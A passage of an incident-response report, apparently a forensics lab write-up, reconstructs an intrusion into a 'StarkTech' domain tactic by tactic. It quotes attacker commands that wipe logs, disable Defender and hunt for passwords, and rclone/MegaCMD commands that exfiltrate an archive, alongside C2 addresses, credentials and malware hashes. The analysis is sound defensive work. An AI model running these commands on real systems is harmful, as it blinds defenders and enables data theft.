id="1dbb727b-1373-80d3-9b58-f8b7757fef9b" class="bulleted-list"><li style="list-style-type:disc"><strong>Risk:</strong> High-severity compromise of a DC—check for <strong>credential theft (Mimikatz), lateral movement, or ransomware</strong> via <code>crypto.psm1</code>.</li></ul><figure id="1dbb727b-1373-809c-8973-cafd3cdd458c" class="image"><a href="Screen_Shot_2025-04-20_at_8.21.34_PM.png"><img style="width:2272px" src="Screen_Shot_2025-04-20_at_8.21.34_PM.png"/></a></figure><figure id="1dbb727b-1373-80af-a974-e69f7b298eaf" class="image"><a href="Screen_Shot_2025-04-20_at_8.34.52_PM.png"><img style="width:2838px" src="Screen_Shot_2025-04-20_at_8.34.52_PM.png"/></a></figure><p id="1dbb727b-1373-80d9-b5a7-c2404ab4ca73" class="">
+</p><hr id="1dbb727b-1373-8014-a182-e0a6e2b3ecd4"/><h2 id="1dbb727b-1373-807d-9ed3-cd219f0a65f3" class=""><br/>Persistence <br/></h2><table id="1dab727b-1373-80fe-890a-cae2ff86e4cd" class="simple-table"><tbody><tr id="1dab727b-1373-804e-b508-d84fd87f4dcd"><td id="^Vut" class="">Mechanism</td><td id="c\&gt;i" class="">Host</td><td id="IlMc" class="">Source</td><td id="DB;n" class="">Details</td></tr><tr id="1dab727b-1373-80e1-9c87-d9a0d8d33e55"><td id="^Vut" class="">AteraAgentServiceWatchdog</td><td id="c\&gt;i" class="">DESKTOP6</td><td id="IlMc" class="">TaskSched 4698</td><td id="DB;n" class="">Boot + hourly tasks restart <code>AteraAgent.exe</code>.</td></tr><tr id="1dab727b-1373-8009-9b5b-d2a89749e4d4"><td id="^Vut" class="">Monitoring Recovery</td><td id="c\&gt;i" class="">DESKTOP6</td><td id="IlMc" class="">Task XML (SS XML1)</td><td id="DB;n" class="">Runs <code>AgentPackageUpgradeAgent.exe</code> at system startup.</td></tr><tr id="1dab727b-1373-80f6-8819-f3a7895988b1"><td id="^Vut" class="">SplashtopRemoteService</td><td id="c\&gt;i" class="">DESKTOP6</td><td id="IlMc" class="">SCM 7045</td><td id="DB;n" class="">Auto-start <code>SRSProxy.exe</code>; provider DLL removed via <code>SetupUtil.exe /P_ST_EVENT</code>.</td></tr><tr id="1dab727b-1373-803e-a0df-ffd6161c9569"><td id="^Vut" class="">AnyDesk Custom Service</td><td id="c\&gt;i" class="">DESKTOP6</td><td id="IlMc" class="">SCM 7045</td><td id="DB;n" class="">Runs custom AnyDesk client MSI as SYSTEM on boot.</td></tr><tr id="1dab727b-1373-8066-9b63-e80592619264"><td id="^Vut" class="">iexploreplugin.exe shortcut</td><td id="c\&gt;i" class="">DESKTOP6</td><td id="IlMc" class="">File System</td><td id="DB;n" class=""><code>%Public%\iexplore.lnk</code> pointing to <code>%TEMP%\iexploreplugin.exe</code>.</td></tr><tr id="1dab727b-1373-80c0-8586-eb20e8b2dc43"><td id="^Vut" class="">IFEO Hijack (<code>Image File Execution Options</code>)</td><td id="c\&gt;i" class="">FILES5</td><td id="IlMc" class="">Registry SS Reg1</td><td id="DB;n" class="">Hijacks <code>iexploreplugin.exe</code> to public folder copy.</td></tr><tr id="1dab727b-1373-80f3-94e5-e8ef79cbec37"><td id="^Vut" class="">Python helper modules</td><td id="c\&gt;i" class="">FILES5</td><td id="IlMc" class="">Sysmon 11 TL 30272/30362</td><td id="DB;n" class="">Drops <code>ws2_32.py</code> &amp; <code>system_module.py</code> under <code>C:\ProgramData\windows</code>.</td></tr></tbody></table><ol type="1" id="1dbb727b-1373-80e9-8294-d602acdacf6a" class="numbered-list" start="1"><li><strong>Services</strong>: AteraAgentService, SplashtopRemoteService, AnyDeskService auto‑start under SYSTEM.<figure id="1dbb727b-1373-809e-aff8-e62deb7c978d" class="image" style="text-align:left"><a href="elex_XGdeXX4a6r.jpg"><img style="width:319px" src="elex_XGdeXX4a6r.jpg"/></a></figure><figure id="1dbb727b-1373-80cf-a9e4-f84d2f41439c" class="image"><a href="notepad_IYk7xkV4pS.jpg"><img style="width:1475px" src="notepad_IYk7xkV4pS.jpg"/></a></figure></li></ol><ol type="1" id="1dbb727b-1373-8025-8cce-c75ea637c9a7" class="numbered-list" start="2"><li><strong>Tasks</strong>: <code>Monitoring Recovery</code> &amp; <code>AteraAgentServiceWatchdog</code> run at boot and hourly.<figure id="1dbb727b-1373-804b-b701-d5414f590b80" class="image" style="text-align:left"><a href="elex_QUm34cZvoB.jpg"><img style="width:319px" src="elex_QUm34cZvoB.jpg"/></a></figure></li></ol><p id="1dbb727b-1373-80f7-a04a-f6824eb6fb65" class="">
+</p><p id="1dbb727b-1373-803b-a169-ed4f04f58a52" class="">3.<strong>User Shortcut</strong>: <code>%Public%\iexplore.lnk</code> creates a double-click path to the backdoor.</p><figure id="1dbb727b-1373-8084-92ac-f689eeab53d9" class="image"><a href="Screen_Shot_2025-04-20_at_6.05.31_PM.png"><img style="width:986.984375px" src="Screen_Shot_2025-04-20_at_6.05.31_PM.png"/></a></figure><p id="1dbb727b-1373-8049-ad6d-ca4946be07c0" class="">there is another artfact from Amcache to prove the excaution.<br/><br/></p><figure id="1dbb727b-1373-8016-9e91-d96ecec16e51" class="image"><a href="Screen_Shot_2025-04-20_at_6.08.06_PM.png"><img style="width:987px" src="Screen_Shot_2025-04-20_at_6.08.06_PM.png"/></a></figure><hr id="1dbb727b-1373-804b-a0cf-e394fecfa903"/><h2 id="1dbb727b-1373-808f-b8c3-e1829947a83f" class=""><br/><br/><strong>Privilege Escalation </strong></h2><ul id="1dab727b-1373-806c-987a-fdb2ef146086" class="bulleted-list"><li style="list-style-type:disc"><strong>Service contexts</strong>: All RMM services and tasks on DESKTOP6 and FILES5 ran as <strong>LocalSystem</strong>, immediately granting SYSTEM privileges to child processes.</li></ul><figure id="1dbb727b-1373-80dd-b328-fac5958ad505" class="image"><a href="Screen_Shot_2025-04-20_at_6.42.32_PM.png"><img style="width:2248px" src="Screen_Shot_2025-04-20_at_6.42.32_PM.png"/></a></figure><p id="1dbb727b-1373-8011-b9f3-d72d647e6cbc" class="">
+</p><hr id="1dab727b-1373-80a7-893c-c5aea09cc19a"/><h2 id="1dbb727b-1373-807b-b21b-f1c886c910fe" class=""><br/><br/>Defense Evasion <br/></h2><table id="1dab727b-1373-8015-9fc7-f97e6837c0de" class="simple-table"><tbody><tr id="1dab727b-1373-80b4-bac6-e48113e15b02"><td id="QsoG" class="">Time</td><td id="]_Be" class="">Host</td><td id="yaLZ" class="">Source</td><td id="^r|\" class="">Action</td></tr><tr id="1dab727b-1373-801f-842d-c13231bc25f3"><td id="QsoG" class="">17:24:50</td><td id="]_Be" class="">DESKTOP6</td><td id="yaLZ" class="">Sysmon 1</td><td id="^r|\" class=""><code>wevtutil cl Microsoft-Windows-Sysmon/Operational</code></td></tr><tr id="1dab727b-1373-80b5-b68d-fff9f2c5f0b5"><td id="QsoG" class="">17:24:51</td><td id="]_Be" class="">DESKTOP6</td><td id="yaLZ" class="">Sysmon 1</td><td id="^r|\" class=""><code>wevtutil cl Microsoft-Windows-StorageManagement/Operational</code></td></tr><tr id="1dab727b-1373-8036-8431-dae15360f731"><td id="QsoG" class="">17:24:52</td><td id="]_Be" class="">DESKTOP6</td><td id="yaLZ" class="">Sysmon 1</td><td id="^r|\" class=""><code>wevtutil cl Microsoft-Windows-Subsys-SMSS/Operational</code></td></tr><tr id="1dab727b-1373-80cc-93b4-d113e92730bc"><td id="QsoG" class="">17:36:12</td><td id="]_Be" class="">DESKTOP6</td><td id="yaLZ" class="">Sysmon 1 (SS SetupUtil)</td><td id="^r|\" class=""><code>SetupUtil.exe /P_ST_EVENT /remove SplashtopProvider.dll</code></td></tr><tr id="1dab727b-1373-80b0-b1f9-ec7b1bb622db"><td id="QsoG" class="">18:01:05</td><td id="]_Be" class="">FILES5</td><td id="yaLZ" class="">PowerShell 600</td><td id="^r|\" class=""><code>Set-MpPreference -DisableRealtimeMonitoring $true</code></td></tr><tr id="1dab727b-1373-80fb-90c7-dea4e8fac197"><td id="QsoG" class="">18:03:44</td><td id="]_Be" class="">FILES5</td><td id="yaLZ" class="">PowerShell 800</td><td id="^r|\" class=""><code>Remove-MpBehavioralNetworkBlockingRules</code></td></tr><tr id="1dbb727b-1373-8070-8706-dcc076f95e2b"><td id="QsoG" class="">22:27:05 27‑Mar</td><td id="]_Be" class="">FILES5</td><td id="yaLZ" class="">Recycle‑Bin delete of staging directory</td><td id="^r|\" class=""></td></tr></tbody></table><ul id="1dbb727b-1373-80d8-9e81-e5e782cab8bd" class="bulleted-list"><li style="list-style-type:disc"><strong>Log Wipes</strong>: Three consecutive <code>wevtutil cl</code> wiped Sysmon, Storage, and SMSS logs.</li></ul><figure id="1dbb727b-1373-80b3-80c1-c15b46d1b333" class="image"><a href="Screen_Shot_2025-04-20_at_6.14.22_PM.png"><img style="width:987px" src="Screen_Shot_2025-04-20_at_6.14.22_PM.png"/></a></figure><ul id="1dbb727b-1373-805d-952b-f9209b239c86" class="bulleted-list"><li style="list-style-type:disc"><strong>AV Disable</strong>: <code>Set-MpPreference -DisableRealtimeMonitoring</code> plus removal of network rules.</li></ul><figure id="1dbb727b-1373-8014-8394-fd940cf9a67e" class="image"><a href="Screen_Shot_2025-04-20_at_6.16.33_PM.png"><img style="width:987px" src="Screen_Shot_2025-04-20_at_6.16.33_PM.png"/></a></figure><ul id="1dbb727b-1373-8023-89d0-c4f01e88a3ea" class="bulleted-list"><li style="list-style-type:disc"><strong>Provider Removal</strong>: <code>SetupUtil.exe /P_ST_EVENT /remove</code> deleted Splashtop’s event DLL from the registry.</li></ul><table id="1dbb727b-1373-8034-8314-d93034ace07a" class="simple-table"><tbody><tr id="1dbb727b-1373-80a5-9d81-e6ddb51e6b22"><td id="=Ay[" class="">22:27:05 27‑Mar</td><td id="OtuC" class="">FILES5</td><td id="Rtp[" class="">Recycle‑Bin delete of staging directory</td><td id="}]BQ" class="">Evidence from RBCmd log</td></tr></tbody></table><figure id="1dbb727b-1373-80d5-b1e8-d720a5214e72" class="image" style="text-align:left"><a href="cmd_PBZzHhEoVf.jpg"><img style="width:347px" src="cmd_PBZzHhEoVf.jpg"/></a></figure><p id="1dbb727b-1373-8063-a978-d55197b17e3d" class="">
+</p><p id="1dbb727b-1373-8018-ad81-f854b3be9d30" class="">
+</p><hr id="1dab727b-1373-80ac-9252-cdf94fbf5612"/><p id="1dab727b-1373-8056-9f71-d2ba20f25c1d" class="">
+</p><h2 id="1dbb727b-1373-80a0-ae66-e8e05dbd4669" class="">Credential Access </h2><p id="1dbb727b-1373-8003-83e2-f9f8a3ac68da" class=""><strong><br/><br/>DLL Injection &amp; Process Access<br/></strong>: At <strong>17:35:24 UTC</strong>, <code>iexploreplugin.exe</code> (T.Leon) opened <code>spoolsv.exe</code> (SYSTEM) with VM_READ permissions, enabling the adversary to inject credential‑dumping code (Sysmon Event 10) (T1036 Masquerading).</p><ul id="1dab727b-1373-8037-9080-d74fac9a39df" class="bulleted-list"><li style="list-style-type:disc"><strong>LSASS Memory Read</strong>: At <strong>17:43:28 UTC</strong>, <code>spoolsv.exe</code> (SYSTEM) opened <code>lsass.exe</code> (SYSTEM) with <code>PROCESS_VM_READ</code> &amp; <code>PROCESS_QUERY_LIMITED_INFORMATION</code> (0x1010), indicating in‑memory credential dumping via Mimikatz‑style routines (Sysmon Event 10) (T1003 Credential Dumping).</li></ul><figure id="1dab727b-1373-8069-a12b-c3a4f31db2d4" class="image"><a href="Screen_Shot_2025-04-19_at_10.14.39_PM.png"><img style="width:2204px" src="Screen_Shot_2025-04-19_at_10.14.39_PM.png"/></a></figure><ul id="1dbb727b-1373-8061-bb3e-d60c3c100933" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-teal">By doing further analysis o</mark>n the <mark class="highlight-red"><mark class="highlight-gray_background">spoolsv.exe</mark></mark> (PID 3236) on FILES5 machine two malicious DLLs were found injected into the process with the names (<mark class="highlight-red"><mark class="highlight-gray_background">powerkatz.dll</mark></mark> and <mark class="highlight-red"><mark class="highlight-gray_background">hashdump.x64.dll</mark></mark>).</li></ul><figure id="1dbb727b-1373-808a-b576-f9719e2ca131" class="image"><a href="notepad_uokCdg90dP.jpg"><img style="width:1474.984375px" src="notepad_uokCdg90dP.jpg"/></a></figure><ul id="1dbb727b-1373-808d-9e0d-ca9e34058c3d" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-teal">Extracting</mark> <mark class="highlight-red"><mark class="highlight-gray_background">powerkatz.dll </mark></mark><mark class="highlight-default"><mark class="highlight-default_background"> from the memory provided, it is proven to be one of the modules that is used by </mark></mark><mark class="highlight-red"><mark class="highlight-gray_background">mimikatz</mark></mark><mark class="highlight-default"><mark class="highlight-default_background">, the hash of this DLL in SHA256 is: </mark></mark><mark class="highlight-red"><mark class="highlight-gray_background">0b9492f204160e98d38dbe9de599dc49224bdbd31fa2369286484528db14e62c</mark></mark><mark class="highlight-default"><mark class="highlight-default_background">, looking up this hash code on VirusTotal:</mark></mark></li></ul><figure id="1dbb727b-1373-80af-9a7c-d736e7ebe64a" class="image"><a href="brave_Rw1sGGIotY.jpg"><img style="width:1474.96875px" src="brave_Rw1sGGIotY.jpg"/></a></figure><ul id="1dbb727b-1373-80ca-b479-dd92010bd71c" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-teal">Repeating the same step</mark>s with the other injected DLL (<mark class="highlight-red"><mark class="highlight-gray_background">hashdump.x64.dll</mark></mark>), the hash code in SHA256 is: <mark class="highlight-red"><mark class="highlight-gray_background">59c4d1f9221d9a77dc4c7578dc40ff29b0eeaab61eb820e7f35c489f10a224ec</mark></mark><mark class="highlight-default"><mark class="highlight-default_background">, and the following is what was found on VirusTotal:</mark></mark></li></ul><figure id="1dbb727b-1373-800d-9a8d-ca3eb363219c" class="image"><a href="brave_B9YUWAXNug.jpg"><img style="width:987px" src="brave_B9YUWAXNug.jpg"/></a></figure><ul id="1dab727b-1373-806c-a8ee-f40ab2b09a3d" class="bulleted-list"><li style="list-style-type:disc"><strong>Module Execution</strong>: In‑memory LaZagne, DonPAPI, and SecretsDump modules ran under <code>pythonw.exe</code> and <code>spools.exe</code> contexts to extract hashed credentials and tickets.<br/><br/><br/></li></ul><figure id="1dbb727b-1373-8074-a290-ebc03b91c756" class="image"><a href="wewee.png"><img style="width:986.984375px" src="wewee.png"/></a></figure><ul id="1dab727b-1373-8027-a335-e89c4dcbd34d" class="bulleted-list"><li style="list-style-type:disc">Legitimate Kerberos tickets for <strong>admin143</strong> and <strong>T.Leon</strong> were reused across DESKTOP6 → FILES5 → DC1 → BACKUP3.</li></ul><hr id="1dab727b-1373-802a-9315-c6881dc7c880"/><h2 id="1dab727b-1373-8059-894b-cc9e68aa62b2" class="">Discovery </h2><table id="1dab727b-1373-8019-8f0e-cd99053c9922" class="simple-table"><tbody><tr id="1dab727b-1373-800f-8ee4-e9f2c49465f4"><td id="fZ`t" class="">Command</td><td id="Y}_Y" class="">Host</td><td id="=x&lt;S" class="">Source</td><td id="Q~I\" class="" style="width:310.3515625px">Purpose</td></tr><tr id="1dab727b-1373-807c-b062-dcad54c24120"><td id="fZ`t" class=""><code>whoami /all</code></td><td id="Y}_Y" class="">DESKTOP6</td><td id="=x&lt;S" class="">Sysmon 4688</td><td id="Q~I\" class="" style="width:310.3515625px">User &amp; group enumeration</td></tr><tr id="1dab727b-1373-803c-987c-e405c7c3d05c"><td id="fZ`t" class=""><code>net1 localgroup administrators</code></td><td id="Y}_Y" class="">DESKTOP6</td><td id="=x&lt;S" class="">Sysmon 4688</td><td id="Q~I\" class="" style="width:310.3515625px">Local administrators list</td></tr><tr id="1dab727b-1373-804b-ab16-df1edfc5f1e4"><td id="fZ`t" class=""><code>net1 share</code></td><td id="Y}_Y" class="">DESKTOP6</td><td id="=x&lt;S" class="">Sysmon 4688</td><td id="Q~I\" class="" style="width:310.3515625px">Share enumeration</td></tr><tr id="1dab727b-1373-80b5-a903-f65ec239aae3"><td id="fZ`t" class=""><code>netstat -ano | find &quot;ESTABLISHED&quot;</code></td><td id="Y}_Y" class="">DESKTOP6</td><td id="=x&lt;S" class="">Sysmon 4688</td><td id="Q~I\" class="" style="width:310.3515625px">Active connection listing</td></tr><tr id="1dab727b-1373-80c9-a317-d064160aac9c"><td id="fZ`t" class=""><code>findstr /r /i &quot;password&quot; *.txt</code></td><td id="Y}_Y" class="">DESKTOP6</td><td id="=x&lt;S" class="">Sysmon 4688</td><td id="Q~I\" class="" style="width:310.3515625px">File contents search</td></tr></tbody></table><figure id="1dbb727b-1373-8089-917e-cff1fa181e30" class="image" style="text-align:left"><a href="elex_pchKEPrqP9.jpg"><img style="width:347px" src="elex_pchKEPrqP9.jpg"/></a></figure><ul id="1dbb727b-1373-80aa-932d-f5cdd4251732" class="bulleted-list"><li style="list-style-type:disc"><code>netstat -ano | find &quot;ESTABLISHED&quot;</code> identified C2 sessions.</li></ul><ul id="1dbb727b-1373-805b-97a2-d23ff63091fe" class="bulleted-list"><li style="list-style-type:disc"><code>whoami /all</code> and <code>net1 localgroup administrators</code> enumerated privileges.</li></ul><figure id="1dbb727b-1373-80cf-8c5f-f32ef9f7bb21" class="image"><a href="Screen_Shot_2025-04-20_at_6.21.52_PM.png"><img style="width:986.984375px" src="Screen_Shot_2025-04-20_at_6.21.52_PM.png"/></a></figure><ul id="1dbb727b-1373-80bf-8b7e-e62a3b58da33" class="bulleted-list"><li style="list-style-type:disc"><code>findstr /r /i &quot;password&quot; *.txt</code> hunted for stored credentials.</li></ul><figure id="1dbb727b-1373-8060-a015-c6103dbd1bf4" class="image" style="text-align:left"><a href="elex_MFewl7ai4M.jpg"><img style="width:347px" src="elex_MFewl7ai4M.jpg"/></a></figure><figure id="1dbb727b-1373-8061-b242-eb42d173c8e1" class="image" style="text-align:left"><a href="elex_wcU6zrI8Ww.jpg"><img style="width:576px" src="elex_wcU6zrI8Ww.jpg"/></a></figure><hr id="1dab727b-1373-8038-a83e-c389eba13663"/><h2 id="1ddb727b-1373-80a6-a7fa-e03c865c9b57" class=""><br/>Lateral Movement <br/><br/></h2><table id="1dab727b-1373-80d1-9c2c-cd0f8ebb6347" class="simple-table"><tbody><tr id="1dab727b-1373-80b3-9af8-ca62cc8b698a"><td id="^kTG" class="">Time</td><td id="JCP:" class="">Path</td><td id="UZeF" class="">Technique</td><td id="SH\`" class="">Evidence</td></tr><tr id="1dab727b-1373-8053-a678-eb8223555df7"><td id="^kTG" class="">17:50:12 25‑Mar</td><td id="JCP:" class="">DESKTOP6 → FILES5</td><td id="UZeF" class="">T1047 WMI Exec</td><td id="SH\`" class="">Impacket Command; Defender 1116</td></tr><tr id="1dab727b-1373-8087-b464-ef90ae9d640a"><td id="^kTG" class="">19:49:43 26‑Mar</td><td id="JCP:" class="">10.135.85.15 → FILES5</td><td id="UZeF" class="">T1021.001 RDP</td><td id="SH\`" class="">Security 1149 (admin143)</td></tr><tr id="1dab727b-1373-8049-bbd9-ff7e70dd98ac"><td id="^kTG" class="">20:12:09 26‑Mar</td><td id="JCP:" class="">DESKTOP6 → FILES5</td><td id="UZeF" class="">T1021.002 SMB</td><td id="SH\`" class="">Security 4624 Type 3</td></tr><tr id="1dab727b-1373-8001-8be3-c6d92bf69ae7"><td id="^kTG" class="">20:51:52 26‑Mar</td><td id="JCP:" class="">DC1 → BACKUP3</td><td id="UZeF" class="">T1021.006 PS Remoting</td><td id="SH\`" class="">PowerShell 800 (TL 909983)</td></tr><tr id="1dab727b-1373-8033-959d-ed3dc90ec4ab"><td id="^kTG" class="">02:15:10 27‑Mar</td><td id="JCP:" class="">DESKTOP6 → DC2</td><td id="UZeF" class="">T1021.004 Splashtop</td><td id="SH\`" class="">SRAgent log (SS Splashtop)</td></tr></tbody></table><figure id="1dbb727b-1373-80b4-9d75-e704a6e3bf18" class="image" style="text-align:left"><a href="elex_RyIRCQMpXO.jpg"><img style="width:347px" src="elex_RyIRCQMpXO.jpg"/></a></figure><hr id="1dab727b-1373-8095-ba94-d738825d128c"/><h2 id="1ddb727b-1373-80ad-bb92-d03bf8c649a1" class=""><br/>Collection <br/></h2><table id="1dab727b-1373-8015-8598-d8733aaa9bcf" class="simple-table"><tbody><tr id="1dab727b-1373-8093-8e3e-f78e856dedeb"><td id="~gWN" class="">Time</td><td id="UQ&lt;v" class="">Host</td><td id="OW{M" class="">Command</td><td id="NNr_" class="">Size / Output</td></tr><tr id="1dab727b-1373-8033-953d-f2b4e111b6f6"><td id="~gWN" class="">9:57:34 26‑Mar</td><td id="UQ&lt;v" class="">FILES5</td><td id="OW{M" class=""><code>Compress-Archive C:\ProgramData\Teams teams-starktech.zip</code></td><td id="NNr_" class="">63 218 805 bytes</td></tr><tr id="1dab727b-1373-80bf-8659-d1cf840a4410"><td id="~gWN" class="">9:10:02 25‑Mar</td><td id="UQ&lt;v" class="">FILES5</td><td id="OW{M" class=""><code>Compress-Archive C:\Logs\ADbuild.log adbuild.zip</code></td><td id="NNr_" class="">4 214 328 bytes</td></tr></tbody></table><ul id="1dbb727b-1373-80f1-8a38-e5b073bf86fa" class="bulleted-list"><li style="list-style-type:disc"><code>Compress-Archive</code> created 63 MB Teams zip and AD logs.</li></ul><ul id="1dbb727b-1373-8088-aec1-fbee00d91009" class="bulleted-list"><li style="list-style-type:disc">Splashtop sessions provided screenshots and keystroke capture in transit.</li></ul><figure id="1dbb727b-1373-80a5-bd43-c175a13bfb36" class="image"><a href="Screen_Shot_2025-04-20_at_6.25.47_PM.png"><img style="width:2216px" src="Screen_Shot_2025-04-20_at_6.25.47_PM.png"/></a></figure><p id="1dbb727b-1373-804c-bcd8-e5dc01e00369" class="">a PowerShell window flickered to life on a machine in the <strong>StarkTech</strong> domain. The user, <strong>admin143</strong>, had just executed a command:</p><blockquote id="1dbb727b-1373-8083-8b65-e7c1e28f396b" class="">&quot;Compress-Archive&quot; – a simple PowerShell cmdlet meant to bundle files into a neat ZIP archive.</blockquote><p id="1dbb727b-1373-806d-b0f5-cbedf42497e4" class="">The destination? <code><strong>C:\ProgramData\Teams\teams-starktech.zip</strong></code>.</p><figure id="1dbb727b-1373-8099-ab14-e9587c1d69d1" class="image"><a href="Screen_Shot_2025-04-20_at_6.33.42_PM.png"><img style="width:2050px" src="Screen_Shot_2025-04-20_at_6.33.42_PM.png"/></a></figure><hr id="1dab727b-1373-80b3-a070-c4a53c81984a"/><h2 id="1ddb727b-1373-808a-a4da-fd5995498654" class=""><br/><br/>Command &amp; Control <br/></h2><table id="1dab727b-1373-80ea-afd7-ef5d61913363" class="simple-table"><tbody><tr id="1dab727b-1373-8083-b1a3-f75ed80a36ed"><td id="ii&gt;\" class="">Channel</td><td id="gorp" class="">Destination</td><td id="@HnD" class="">Details</td></tr><tr id="1dab727b-1373-80f5-9029-e664452ec413"><td id="ii&gt;\" class="">Raw TCP</td><td id="gorp" class="">35.226.173.183:8000</td><td id="@HnD" class="">Sliver frame stream (Sysmon 3)</td></tr><tr id="1dab727b-1373-80eb-bab1-e04249feafb2"><td id="ii&gt;\" class="">HTTPS (ChaCha20)</td><td id="gorp" class="">agegamepay.com:8443</td><td id="@HnD" class="">SNI=agegamepay.com; Basic‑Auth=testuser:Sup3rP4ss!</td></tr><tr id="1dab727b-1373-8075-9493-e1934706b267"><td id="ii&gt;\" class="">MQTT‑TLS</td><td id="gorp" class="">34.29.169.45:8883</td><td id="@HnD" class="">Initial payload host for python.zip</td></tr></tbody></table><h2 id="1dab727b-1373-80b4-a8ba-e73324277985" class="">Exfiltration </h2><table id="1dab727b-1373-8014-847f-f7a3080d6b70" class="simple-table"><tbody><tr id="1dab727b-1373-80d5-8aea-dbc47b65e890"><td id="pW=&gt;" class="">Time</td><td id="tDdA" class="">Host</td><td id="lfGT" class="">Action</td><td id="eJLC" class="">Details</td></tr><tr id="1dab727b-1373-808e-9383-e2c9f39dd913"><td id="pW=&gt;" class="">18:13–18:18 25‑Mar</td><td id="tDdA" class="">FILES5</td><td id="lfGT" class=""><code>rclone copy teams-starktech.zip remote:starktech-backups</code></td><td id="eJLC" class="">rclone 1.69.1</td></tr><tr id="1dab727b-1373-80be-85e9-c65ce0062138"><td id="pW=&gt;" class="">18:18:22 25‑Mar</td><td id="tDdA" class="">FILES5</td><td id="lfGT" class=""><code>copy teams-starktech.zip &quot;%ProgramData%\Microsoft\Teams\mega:V1A\&quot;</code></td><td id="eJLC" class="">MegaCMD mount</td></tr></tbody></table><figure id="1dbb727b-1373-8054-940c-e51c86adf888" class="image"><a href="sdsd.png"><img style="width:986.96875px" src="sdsd.png"/></a></figure><p id="1dbb727b-1373-8059-aeac-c4965ea1a0be" class="">
+</p><figure id="1dbb727b-1373-80fb-acb7-e8e440ac44b4" class="image"><a href="Screen_Shot_2025-04-20_at_8.51.50_PM.png"><img style="width:986.984375px" src="Screen_Shot_2025-04-20_at_8.51.50_PM.png"/></a></figure><p id="1dbb727b-1373-8039-b21d-f2fec5a67793" class="">
+</p><p id="1dbb727b-1373-8093-a6b2-f80f9d17177c" class="">2.</p><figure id="1dbb727b-1373-8017-b7b6-edb22512950d" class="image" style="text-align:left"><a href="cmd_PBZzHhEoVf.jpg"><img style="width:347px" src="cmd_PBZzHhEoVf.jpg"/></a></figure><hr id="1dbb727b-1373-8091-85ff-fde26c440f54"/><h2 id="1dbb727b-1373-8069-932a-ca0087f0e8de" class=""><br/>Impact<br/></h2><ul id="1dab727b-1373-8053-a87c-d7b8aea40ace" class="bulleted-list"><li style="list-style-type:disc"><strong>Data theft:</strong> 63 MB Teams archive + AD logs exfiltrated.</li></ul><ul id="1dab727b-1373-801b-96a1-dc64ab123683" class="bulleted-list"><li style="list-style-type:disc"><strong>Visibility loss:</strong> Defender off, logs erased.</li></ul><ul id="1dab727b-1373-80d3-ac14-d430d3e3ac4c" class="bulleted-list"><li style="list-style-type:disc"><strong>No destructive payload</strong> executed—no ransomware or encryption.<strong><br/><br/></strong></li></ul><hr id="1dab727b-1373-8085-a0c3-c61a3a766bdf"/><p id="1dab727b-1373-8089-a0b0-d390d600dda2" class="">25 Mar 2025<br/>├─ 17 : 24 – <br/><a href="http://paste.sh/">Paste.sh</a> PowerShell launches downloader<br/>│    └─ Invoke‑WebRequest → %TEMP%\iexploreplugin.exe<br/>├─ 17 : 29 – Explorer executes iexploreplugin.exe<br/>├─ 17 : 24–17 : 25 – Log wiping (wevtutil cl Sysmon, Storage, SMSS)<br/>├─ 17 : 30 – AteraAgent, Splashtop, AnyDesk installed via msiexec /qn<br/>│    ├─ 17 : 33 – Splashtop Streamer service install<br/>│    └─ 17 : 45 – AnyDesk custom client service install<br/>├─ 17 : 36 – Splashtop event provider removed (SetupUtil.exe)<br/>├─ 17 : 50 – WMI Exec pivot to FILES5 (ImpacketExec)<br/>├─ 17 : 56 – Defender flags python.zip download (Event 1116)<br/>├─ 18 : 01 – Defender real‑time monitoring disabled<br/>├─ 18 : 04 – Expand‑Archive python.zip; pythonw.exe loads <br/><a href="http://testc.py/">testc.py</a><br/>│    └─ DLL side‑load python311.dll<br/>├─ 18 : 07 – Helper modules dropped (ws2_32.py, system_module.py)<br/>├─ 18 : 07 – C2 channels established<br/>│    ├─ 35.226.173.183:8000 (raw Sliver)<br/>│    └─ <br/><a href="http://agegamepay.com:8443/">agegamepay.com:8443</a> (HTTPS/ChaCha20)<br/>├─ 18 : 13–18 : 18 – rclone &amp; MegaCMD exfil of Teams &amp; AD logs<br/>│    └─ Copy to %ProgramData%\...mega:V1A<br/>├─ 19 : 49 – RDP (1149) into FILES5 (admin143 @ 10.135.85.15)<br/>├─ 20 : 12 – SMB logon (4624 Type 3) admin143 → FILES5<br/>├─ 20 : 51 – PS Remoting (Invoke‑Command ‑AsJob) to BACKUP3<br/>├─ 27 : 02 : 15 – Splashtop GUI session from DESKTOP6 → DC2<br/>└─ 27 : 22 : 27 – rclone staging directory deleted<br/><br/><br/></p><figure id="1dbb727b-1373-80da-b848-c1c99776d0e3" class="image"><a href="ChatGPT_Image_Apr_20_2025_08_54_24_PM.png"><img style="width:987px" src="ChatGPT_Image_Apr_20_2025_08_54_24_PM.png"/></a></figure><hr id="1dab727b-1373-80fd-83c6-d25e5cfa3baf"/><h2 id="1dab727b-1373-80d6-95a6-f33acf0bb5d4" class="">Diamond Model<br/><br/></h2><figure id="1dbb727b-1373-80c6-9286-ccecd0f67e6e" class="image"><a href="ChatGPT_Image_Apr_20_2025_09_02_36_PM.png"><img style="width:987px" src="ChatGPT_Image_Apr_20_2025_09_02_36_PM.png"/></a></figure><p id="1dbb727b-1373-8019-b398-f3c2bbb894c2" class="">
+</p><ul id="1dbb727b-1373-801f-9dc1-d1ac7a601ecf" class="bulleted-list"><li style="list-style-type:disc"><strong>Adversary</strong>:<ul id="1dbb727b-1373-80c0-b525-f23ef77d63bd" class="bulleted-list"><li style="list-style-type:circle">paste.sh one‑liner</li></ul><ul id="1dbb727b-1373-80cb-97d5-fc0e1efbdc76" class="bulleted-list"><li style="list-style-type:circle">AteraAgent installer</li></ul><ul id="1dbb727b-1373-806b-a5be-eae4dd9c7b26" class="bulleted-list"><li style="list-style-type:circle">iexploreplugin.exe</li></ul><ul id="1dbb727b-1373-8068-a7b9-cc3d909fe90d" class="bulleted-list"><li style="list-style-type:circle">AnyDesk &amp; Splashtop</li></ul></li></ul><ul id="1dbb727b-1373-801b-beaa-fed755a2a741" class="bulleted-list"><li style="list-style-type:disc"><strong>Infrastructure</strong>:<ul id="1dbb727b-1373-801b-959e-e5fb773de9e6" class="bulleted-list"><li style="list-style-type:circle">Domain: agegamepay.com</li></ul><ul id="1dbb727b-1373-8056-8a2d-e67aa03d93c4" class="bulleted-list"><li style="list-style-type:circle">C2 IPs/Ports:<p id="1dbb727b-1373-802f-8b30-e381f6a5528b" class="">- 34.29.169.45 